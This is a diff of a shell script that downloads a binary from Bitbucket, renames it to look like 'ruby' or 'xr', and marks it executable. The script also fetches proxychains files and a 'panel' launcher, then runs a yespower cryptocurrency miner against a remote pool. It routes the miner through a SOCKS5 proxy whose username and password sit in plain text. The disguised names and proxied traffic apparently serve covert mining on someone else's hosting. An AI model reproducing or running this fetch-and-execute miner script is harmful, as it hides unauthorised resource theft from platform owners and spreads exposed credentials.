@@ -1,8 +1,8 @@
-proxy="us-east-static-08.quotaguard.com" 
+proxy="52.5.38.201" 
 port="9293" 
-user="55oqkntawxilzm"  
-pass="v9yktkydvcgga5lfhv0uwd1ocvwo2p" 
-wget -q -O ruby https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x ruby
+user="do6hinrjq4aptu"  
+pass="v1cxl8q3ewwdpy0mv9ghz0fttsgu" 
+wget -q -O xr https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x xr
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./ruby -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 99-9999 -n 1)-Kusumoto) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://55oqkntawxilzm:v9yktkydvcgga5lfhv0uwd1ocvwo2p@us-east-static-08.quotaguard.com:1080 
+./panel ./xr -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-MorimotoNobusuke) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://do6hinrjq4aptu:v1cxl8q3ewwdpy0mv9ghz0fttsgu@us-east-static-06.quotaguard.com:1080 
